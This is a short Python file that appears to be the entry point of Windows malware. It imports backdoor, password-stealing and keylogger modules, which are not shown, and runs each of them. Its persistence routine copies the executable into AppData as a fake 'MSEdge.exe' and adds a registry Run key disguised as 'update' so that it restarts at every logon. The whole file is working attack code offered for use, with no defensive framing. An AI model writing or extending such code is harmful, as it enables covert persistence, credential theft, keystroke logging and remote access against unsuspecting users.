import backdoor
import keylogger
import passwords
import os
import shutil
import subprocess
import sys
import multiprocessing

def persistence():
    new_location = os.environ["appdata"] + "\\MSEdge.exe"
    if not os.path.exists(new_location):
        shutil.copyfile(sys.executable, new_location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + new_location + '"',shell=True)


if __name__ == "__main__":
    persistence()
    backdoor.main()
    passwords.main()
    keylogger.main()	
    